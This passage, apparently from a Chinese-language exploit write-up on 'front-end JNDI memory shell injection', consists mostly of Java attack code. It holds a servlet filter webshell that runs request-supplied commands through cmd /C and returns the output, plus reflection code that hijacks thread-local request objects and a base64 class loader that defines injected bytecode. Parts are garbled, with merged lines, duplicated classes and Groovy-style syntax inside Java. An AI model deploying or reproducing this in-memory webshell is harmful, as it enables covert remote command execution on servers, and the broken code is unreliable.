            }else{
                cmds = new String[]{"cmd", "/C", cmd};
            }
            Process process = Runtime.getRuntime().exec(cmds);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
 servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }
    @Override
    public void destroy() {
    }
    public static Object getField(Object obj, String fieldName) throws Exception {
        Field f0 = null;
        Class clas = obj.getClass();
        while (clas != Object.class){
前台 JNDI 内存马注⼊
由于前台是内存马注⼊会超长，所以采⽤ JNDI 注⼊来缩减长度
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }
        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }
}
public class x {
    public Object req = null;
    public Object resp = null;
    def x(){
        Class clazz = Thread.currentThread().getClass();
        java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
        field.setAccessible(true);
        Object obj = field.get(Thread.currentThread());
        field = obj.getClass().getDeclaredField("table");
        field.setAccessible(true);
        obj = field.get(obj);
        Object[] obj_arr = (Object[]) obj;
        for(int i = 0; i  getClass(String classCode) throws IOException, 
 java.lang.reflect.InvocationTargetException, IllegalAccessException, 
NoSuchMethodException, InstantiationException {
        ClassLoader loader= Thread.currentThread().getContextClassLoader();
        sun.misc.BASE64Decoder base64Decoder = new sun.misc.BASE64Decoder();
        java.lang.reflect.Method method = null;
        byte[] bytes = base64Decoder.decodeBuffer(classCode);
        Class clz  = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, 
int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }
        if (method != null) {
            method.setAccessible(true);
            return (Class) method.invoke(loader, bytes, 0, bytes.length);
        }
        return null;
    }
}
public class x extends javax.servlet.http.HttpServlet{
    public Object req = null;
    public Object resp = null;
    def x(){
        Class clazz = Thread.currentThread().getClass();
        java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
        field.setAccessible(true);
        Object obj = field.get(Thread.currentThread());
        field = obj.getClass().getDeclaredField("table");
        field.setAccessible(true);
        obj = field.get(obj);
        Object[] obj_arr = (Object[]) obj;
        for(int i = 0; i  getClass(String classCode) throws IOException, 
 java.lang.reflect.InvocationTargetException, IllegalAccessException, 
NoSuchMethodException, InstantiationException {
        ClassLoader loader= Thread.currentThread().getContextClassLoader();
        sun.misc.BASE64Decoder base64Decoder = new sun.misc.BASE64Decoder();
        java.lang.reflect.Method method = null;
        byte[] bytes = base64Decoder.decodeBuffer(classCode);
        Class clz  = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, 
int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }
        resp.getWriter().println(method.getName())
        if (method != null) {
            method.setAccessible(true);
            return (Class) method.invoke(loader, bytes, 0, bytes.length);
        }
        return null;
    }
}